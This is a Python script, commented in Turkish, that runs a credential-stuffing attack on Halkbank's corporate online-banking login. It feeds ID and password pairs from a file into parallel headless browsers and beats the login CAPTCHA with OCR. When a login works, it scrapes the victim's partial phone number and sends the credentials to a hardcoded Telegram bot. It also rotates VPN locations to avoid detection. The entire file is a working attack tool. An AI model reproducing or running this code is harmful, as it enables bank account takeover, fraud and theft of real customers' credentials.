import sys
import subprocess
from pathlib import Path
from urllib.parse import urlsplit, urlencode
import urllib.request
import ssl
import time
import threading
import queue
import shutil
import tempfile
import atexit

# -------------------------------------------------
# Environment bootstrap – install required packages
# -------------------------------------------------
import platform
from vpn_manager import vpn_bot

import platform

# Define paths early so they are available for setup_environment
ROOT = Path(__file__).resolve().parent
BILGILER_FILE = ROOT / 'bilgiler.txt'

def setup_environment():
# (Bootstrap code already executed above – duplicate removed)
    # Install Python packages if missing
    try:
        import ddddocr  # noqa: F401
        import playwright  # noqa: F401
    except Exception:
        print("[SETUP] Installing required Python packages (ddddocr, playwright)...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "ddddocr", "playwright"])
        # Install Playwright browsers
        subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"])
    # Linux system dependencies for headless Chromium
    if platform.system() == "Linux":
        print("[SETUP] Installing Linux system dependencies for Chromium...")
        try:
            subprocess.check_call(["sudo", "apt-get", "update"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.check_call([
                "sudo", "apt-get", "install", "-y",
                "libnss3", "libatk-bridge2.0-0", "libx11-xcb1", "libxcomposite1",
                "libxdamage1", "libxrandr2", "libgbm1", "libasound2"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"[SETUP] Linux dependencies install failed: {e}")
    # Ensure bilgiler.txt exists
    if not BILGILER_FILE.exists():
        print(f"[SETUP] Creating empty {BILGILER_FILE.name} as it was missing.")
        BILGILER_FILE.write_text("# TC:PAROLA format, one per line\n", encoding="utf-8")

# Run bootstrap before any other logic
setup_environment()
# Duplicate bootstrap code removed – environment already set up above.


# Run bootstrap before any other logic
setup_environment()



def ensure_dependencies():
    """Gerekli kutuphaneleri ve Chromium tarayici motorunu kontrol eder."""
    # pip guncelle
    try:
        import ddddocr
        HAS_OCR = True
    except ImportError:
        print("[BILGI] ddddocr eksik, yukleniyor...")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'ddddocr'])
            import ddddocr
            HAS_OCR = True
            print("[BILGI] ddddocr kuruldu!")
        except Exception as e:
            print(f"[UYARI] ddddocr yuklenemedi: {e}")
            HAS_OCR = False

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("[BILGI] playwright eksik, yukleniyor...")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'playwright'])
            print("[BILGI] playwright kuruldu!")
        except Exception as e:
            print(f"[UYARI] playwright yuklenemedi: {e}")

    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            if not Path(p.chromium.executable_path).exists():
                raise FileNotFoundError("Chromium eksik")
    except Exception:
        print("[BILGI] Chromium tarayicisi eksik, kuruluyor...")
        try:
            subprocess.check_call([sys.executable, '-m', 'playwright', 'install', 'chromium'])
            print("[BILGI] Chromium basariyla kuruldu!\n")
        except Exception as e:
            print(f"[UYARI] Chromium yuklenemedi: {e}")

ensure_dependencies()

from playwright.sync_api import sync_playwright

HAS_OCR = False
OCR_ENGINE = None
try:
    import ddddocr
    OCR_ENGINE = ddddocr.DdddOcr(beta=True, show_ad=False)
    HAS_OCR = True
    print("[OK] CAPTCHA OCR motoru basariyla hazirlandi.")
except Exception as e:
    print(f"[UYARI] OCR motoru baslatilamadi: {e}")

ROOT = Path(__file__).resolve().parent
BILGILER_FILE = ROOT / 'bilgiler.txt'

BILGILER_FILE = ROOT / 'bilgiler.txt'
URL = 'https://sube.halkbank.com.tr/InternetBankingHost/HostLogin?CustomerType=Corporate'

# Ayarlar:
HEADLESS = True           # Tarayiciyi goster (Ekranda acik calisir - Gizlemek icin True yapabilirsiniz)
AUTO_SUBMIT = True         # CAPTCHA doldurulduktan sonra otomatik Giris dugmesine basilsin mi
AUTO_SUBMIT_DELAY = 0      # Giris dugmesine basmadan once bekleme suresi (0 = aninda basar)

# Telegram Ayarlari:
TG_BOT_TOKEN = '9110259018:AAE-19j5VcA1tu0fgkUSIZk4cbQ5UI1_JZc'
TG_CHAT_ID = '-1003574765302'

# Disk ve Bellek Tasarrufu Icin Chromium Parametreleri (C Diskinin Dolmasini Engeller):
CHROMIUM_ARGS = ["--no-sandbox","--disable-setuid-sandbox","--disable-dev-shm-usage","--disable-gpu","--disable-features=IsolateOrigins,site-per-process"]

# ----- VPN Integration (disabled) -----
def switch_vpn():
    """VPN disabled version – does nothing."""
    safe_print("[VPN] Disabled – no VPN used.")


def cleanup_temp():
    """Gecici Playwright profil ve artik dosyalarini temizler."""
    try:
        temp_dir = Path(tempfile.gettempdir())
        for pat in ('*playwright*', 'scoped_dir*'):
            for p in temp_dir.glob(pat):
                try:
                    if p.is_dir():
                        shutil.rmtree(p, ignore_errors=True)
                    else:
                        p.unlink(missing_ok=True)
                except Exception:
                    pass
    except Exception:
        pass

atexit.register(cleanup_temp)

OCR_LOCK = threading.Lock()
FILE_LOCK = threading.RLock()
PRINT_LOCK = threading.Lock()


def safe_print(msg):
    with PRINT_LOCK:
        print(msg, flush=True)


def send_telegram(tc, password, phone_end=None):
    if not TG_BOT_TOKEN or not TG_CHAT_ID:
        return
    try:
        msg = (
            f"✅ [BAŞARILI] Giriş Algılandı!\n\n"
            f"👤 TC: {tc}\n"
            f"🔑 Parola: {password}"
        )
        if phone_end:
            msg += f"\n📱 {phone_end} NUMARASI SONU"
        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
        data = urlencode({'chat_id': TG_CHAT_ID, 'text': msg}).encode('utf-8')
        req = urllib.request.Request(url, data=data, method='POST')
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            if resp.status == 200:
                safe_print(f'[{tc}] Telegram bildirimi basariyla gonderildi!')
    except Exception as e:
        safe_print(f'[{tc}] Telegram bildirim hatasi: {e}')


def load_accounts():
    if not BILGILER_FILE.exists():
        raise FileNotFoundError('bilgiler.txt dosyasi bulunamadi.')
    raw_lines = BILGILER_FILE.read_text(encoding='utf-8-sig').splitlines()
    accounts = []
    for line in raw_lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if ':' not in line:
            continue
        tc, password = line.split(':', 1)
        tc = tc.strip()
        password = password.strip()
        if tc.isdigit() and len(tc) == 11 and password:
            accounts.append((tc, password))
    if not accounts:
        raise ValueError('bilgiler.txt dosyasinda en az bir adet gecerli "TC:PAROLA" satiri bulunmalidir.')
    return accounts

PENDING_REMOVALS = set()
LAST_SAVE_TIME = time.time()

def flush_removed_accounts():
    """Toplu silinen hesaplari bilgiler.txt dosyasina guvenli sekilde yazar."""
    global LAST_SAVE_TIME
    with FILE_LOCK:
        if not PENDING_REMOVALS or not BILGILER_FILE.exists():
            return
        try:
            lines = BILGILER_FILE.read_text(encoding='utf-8-sig').splitlines()
            new_lines = []
            for line in lines:
                stripped = line.strip()
                if ':' in stripped and not stripped.startswith('#'):
                    parts = stripped.split(':', 1)
                    pair = (parts[0].strip(), parts[1].strip())
                    if pair in PENDING_REMOVALS:
                        PENDING_REMOVALS.remove(pair)
                        continue
                new_lines.append(line)
            tmp_file = BILGILER_FILE.with_suffix('.tmp')
            tmp_file.write_text('\n'.join(new_lines) + ('\n' if new_lines else ''), encoding='utf-8')
            tmp_file.replace(BILGILER_FILE)
            LAST_SAVE_TIME = time.time()
        except Exception as e:
            safe_print(f'bilgiler.txt kaydetme hatasi: {e}')

atexit.register(flush_removed_accounts)

def remove_account_from_file(tc, password, force=False):
    """Gercekten denenen hesabi listeye ekler ve periyodik olarak diske yazar (C diskinde surekli dosya yaz-sil olmasini onler)."""
    global LAST_SAVE_TIME
    with FILE_LOCK:
        PENDING_REMOVALS.add((tc, password))
        if force or len(PENDING_REMOVALS) >= 20 or (time.time() - LAST_SAVE_TIME) > 3:
            flush_removed_accounts()

def solve_captcha(page, worker_id, tc):
    """Halkbank BotDetect guvenlik kodunu ddddocr beta modeli ile cozer."""
    if not HAS_OCR or OCR_ENGINE is None:
        return None
    captcha_img = page.locator('#HalkbankLoginCaptchaCorporate_CaptchaImage:visible, #HalkbankLoginCaptchaRetail_CaptchaImage:visible')
    for attempt in range(1, 5):
        try:
            captcha_img.wait_for(state='visible', timeout=5000)
            img_bytes = captcha_img.screenshot()
            with OCR_LOCK:
                raw_text = OCR_ENGINE.classification(img_bytes).strip().upper()
            code = ''.join(c for c in raw_text if c.isalnum())
            if len(code) == 5:
                return code
            else:
                try:
                    page.eval_on_selector('#HalkbankLoginCaptchaCorporate_ReloadIcon, #HalkbankLoginCaptchaRetail_ReloadIcon', 'el => el.click()')
                except Exception:
                    pass
                page.wait_for_timeout(500)
        except Exception as e:
            safe_print(f'[Tarayici-{worker_id} | {tc}] CAPTCHA cozme hatasi: {e}')
            break
    return code if 'code' in locals() and code else None


def worker_loop(worker_id, task_queue, total_count):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=HEADLESS, args=CHROMIUM_ARGS)
        context = browser.new_context(locale='tr-TR')
        page = context.new_page()
        req_count = 0
        try:
            while True:
                try:
                    idx, tc, password = task_queue.get_nowait()
                except queue.Empty:
                    break
                req_count += 1
                if req_count % 100 == 0:
                    try:
                        page.close()
                        context.close()
                        context = browser.new_context(locale='tr-TR')
                        page = context.new_page()
                    except Exception:
                        pass
                safe_print(f'[Tarayici-{worker_id}] ({idx}/{total_count}) {tc} deneniyor...')
                account_tested = False
                try:
                    page.goto(URL, wait_until='domcontentloaded', timeout=60000)
                    if urlsplit(page.url).hostname != 'sube.halkbank.com.tr':
                        safe_print(f'[Tarayici-{worker_id} | {tc}] Beklenen resmi banka adresi acilmadi (Silinmedi, tekrar denenecek).')
                        task_queue.put((idx, tc, password))
                        continue
                    try:
                        corp_tab = page.locator('text=KURUMSAL')
                        if corp_tab.count() > 0 and not page.locator('#PinLoginCustomerCorporateID').is_visible():
                            corp_tab.first.click(force=True)
                            page.wait_for_timeout(500)
                    except Exception:
                        pass
                    tc1 = page.locator('#PinLoginCustomerCorporateID')
                    tc1.wait_for(state='visible', timeout=25000)
                    tc2 = page.locator('input[name="CorporateCustomerNumber"]')
                    tc2.wait_for(state='visible', timeout=25000)
                    secret = page.locator('input[name="FirstLoginPasswordNotEncrypt"]:visible')
                    secret.wait_for(state='visible', timeout=25000)
                    captcha_input = page.locator('input[name="CaptchaCode"]:visible')
                    submit_btn = page.locator('input.loginBtn.green:visible')
                    tc1.fill(tc)
                    tc2.fill(tc)
                    secret.fill(password)
                    code = solve_captcha(page, worker_id, tc)
                    if code:
                        captcha_input.fill(code)
                    else:
                        safe_print(f'[Tarayici-{worker_id} | {tc}] CAPTCHA okunamadi, tekrar denenecek (Silinmedi)...')
                        task_queue.put((idx, tc, password))
                        continue
                    try:
                        page.evaluate('() => document.querySelectorAll(".ui-keyboard").forEach(el => el.style.display = "none")')
                    except Exception:
                        pass
                    if AUTO_SUBMIT and code:
                        if AUTO_SUBMIT_DELAY > 0:
                            time.sleep(AUTO_SUBMIT_DELAY)
                        submit_btn.click(force=True)
                    is_success = False
                    has_error = False
                    err_message = ''
                    phone_end = None
                    for _ in range(40):
                        page.wait_for_timeout(150)
                        try:
                            state = page.evaluate('''() => {
                                const bodyText = document.body ? document.body.innerText : "";
                                let phoneEnd = null;
                                const phoneMatch = bodyText.match(/\\*{2,}[\\s\\*]*(\\d{2,4})/);
                                if (phoneMatch && phoneMatch[1]) {
                                    phoneEnd = phoneMatch[1];
                                } else {
                                    const inputs = document.querySelectorAll("input, label, span, p, div");
                                    for (const el of inputs) {
                                        const val = (el.value || el.innerText || "").trim();
                                        const m = val.match(/\\*{2,}[\\s\\*]*(\\d{2,4})/);
                                        if (m && m[1]) {
                                            phoneEnd = m[1];
                                            break;
                                        }
                                    }
                                }
                                if (
                                    bodyText.includes("Mobil Onay ile Giriş") ||
                                    bodyText.includes("Mobil Onay") ||
                                    bodyText.includes("SMS Şifresi") ||
                                    bodyText.includes("SMS Onay") ||
                                    bodyText.includes("Doğrulama Kodu") ||
                                    phoneEnd !== null
                                ) {
                                    return { status: "success", msg: "", phone: phoneEnd };
                                }
                                const selectors = [".alert-danger", ".validation-summary-errors", ".field-validation-error",
                                    ".error-message", ".modal-body", ".bootbox-body", ".swal2-content",
                                    ".ui-dialog-content", "#errorDiv", ".login-error", ".warning-text"];
                                for (const sel of selectors) {
                                    const els = document.querySelectorAll(sel);
                                    for (const el of els) {
                                        if (el.offsetParent !== null) {
                                            const t = el.innerText.trim();
                                            if (t.length > 3) return { status: "error", msg: t, phone: null };
                                        }
                                    }
                                }
                                const errKeywords = ["hatalı", "hatali", "yanlış", "yanlis", "geçersiz", "gecersiz",
                                    "başarısız", "basarisiz", "kontrol ediniz", "tekrar deneyiniz",
                                    "bloke", "uyuşmamaktadır", "bulunamadı", "eksik"];
                                const lower = bodyText.toLowerCase();
                                for (const kw of errKeywords) {
                                    if (lower.includes(kw)) {
                                        return { status: "error", msg: "Banka hata uyarisi (" + kw + ")", phone: null };
                                    }
                                }
                                const pinInput = document.querySelector("#PinLoginCustomerCorporateID") || document.querySelector("#PinLoginCustomerID");
                                if (pinInput && pinInput.offsetParent !== null && pinInput.value === "") {
                                    return { status: "error", msg: "Form sifirlandi (Sifre veya kod yanlis)", phone: null };
                                }
                                return { status: "pending", msg: "", phone: null };
                            }''')
                            if state['status'] == 'success':
                                is_success = True
                                phone_end = state.get('phone')
                                if not phone_end:
                                    page.wait_for_timeout(200)
                                    try:
                                        phone_end = page.evaluate('''() => {
                                            const txt = document.body ? document.body.innerText : "";
                                            const m = txt.match(/\\*{2,}[\\s\\*]*(\\d{2,4})/);
                                            return m && m[1] ? m[1] : null;
                                        }''')
                                    except Exception:
                                        pass
                                break
                            elif state['status'] == 'error':
                                has_error = True
                                err_message = state['msg']
                                break
                        except Exception:
                            pass
                    err_lower = err_message.lower()
                    is_captcha_wrong = any(k in err_lower for k in ['güvenlik kodu', 'guvenlik kodu', 'resimdeki', 'doğrulama kodu hatalı', 'dogrulama kodu hatali'])
                    if is_success:
                        account_tested = True
                        vpn_bot.record_success()
                        vpn_bot.record_query()
                        if phone_end:
                            safe_print(f'✅ [BASARILI | Tarayici-{worker_id}] {tc}:{password} -> {phone_end} NUMARASI SONU')
                        else:
                            safe_print(f'✅ [BASARILI | Tarayici-{worker_id}] {tc}:{password} -> Mobil Onay Algilandi!')
                        send_telegram(tc, password, phone_end)
                    elif has_error and is_captcha_wrong:
                        safe_print(f'🔄 [CAPTCHA HATALI | Tarayici-{worker_id}] {tc} -> Guvenlik kodu yanlis okundu, hesap silinmedi tekrar denenecek.')
                        task_queue.put((idx, tc, password))
                    elif has_error:
                        account_tested = True
                        vpn_bot.record_success()
                        vpn_bot.record_query()
                        safe_print(f'❌ [HATALI | Tarayici-{worker_id}] {tc} -> {err_message}')
                    else:
                        account_tested = True
                        vpn_bot.record_success()
                        vpn_bot.record_query()
                        safe_print(f'❌ [HATALI | Tarayici-{worker_id}] {tc} -> Giris basarisiz oldu.')
                except Exception as e:
                    vpn_bot.record_failure()
                    safe_print(f'[Tarayici-{worker_id} | {tc}] Baglanti/Sayfa hatasi (Hesap silinmedi!): {e}')
                    time.sleep(2)
                finally:
                    if account_tested:
                        remove_account_from_file(tc, password)
                    try:
                        context.clear_cookies()
                    except Exception:
                        pass
                    task_queue.task_done()
        finally:
            browser.close()

def main():
    safe_print("=== Halkbank Bot Başlatılıyor ===")
    check = '--check' in sys.argv
    if check:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            page.goto(URL, wait_until='domcontentloaded', timeout=60000)
            print('Resmi giris sayfasi dogrulandi.')
            browser.close()
        return
    if not HAS_OCR or OCR_ENGINE is None:
        print("\n[HATA] CAPTCHA OCR motoru hazir degil! Islem baslatilamadi.")
        print("Lutfen once sunucuda su komutu calistirin: pip install ddddocr\n")
        return
    accounts = load_accounts()
    total_count = len(accounts)
    print(f'Toplam {total_count} hesap bilgisi bilgiler.txt dosyasindan yuklendi.')
    try:
        raw_input = input('Kac tarayici ile acilsin? (Ornek: 1, 3, 5): ').strip()
        num_browsers = int(raw_input) if raw_input else 1
        if num_browsers < 1:
            num_browsers = 1
    except ValueError:
        num_browsers = 1
    num_browsers = min(num_browsers, total_count)
    if HEADLESS:
        print(f'\n{num_browsers} adet gizli tarayici (arka planda) baslatiliyor...')
    else:
        print(f'\n{num_browsers} adet tarayici ekranda baslatiliyor...')
    # VPN başlatılıyor
    safe_print('[VPN] Sistem aktif ediliyor...')
    vpn_bot.change_country(reason="Bot Başlangıcı")
    atexit.register(vpn_bot.stop)
    # Proceed directly to processing accounts
    task_queue = queue.Queue()
    for idx, (tc, password) in enumerate(accounts, start=1):
        task_queue.put((idx, tc, password))
    threads = []
    for w_id in range(1, num_browsers + 1):
        t = threading.Thread(target=worker_loop, args=(w_id, task_queue, total_count))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    flush_removed_accounts()
    cleanup_temp()
    print('\nListedeki tum hesaplar denendi ve bilgiler.txt dosyasindan temizlendi!')

if __name__ == '__main__':
    try:
        cleanup_temp()
        main()
    except (ValueError, FileNotFoundError) as exc:
        print(str(exc))
        sys.exit(1)
    except KeyboardInterrupt:
        flush_removed_accounts()
        cleanup_temp()
        print('\nIslem kullanici tarafindan durduruldu.')
        input("Bitirdi. Çıkmak için Enter'a basın...")
    except Exception as exc:
        flush_removed_accounts()
        cleanup_temp()
        print(f'Baglanti veya sayfa hatasi: {exc}')
        sys.exit(1)
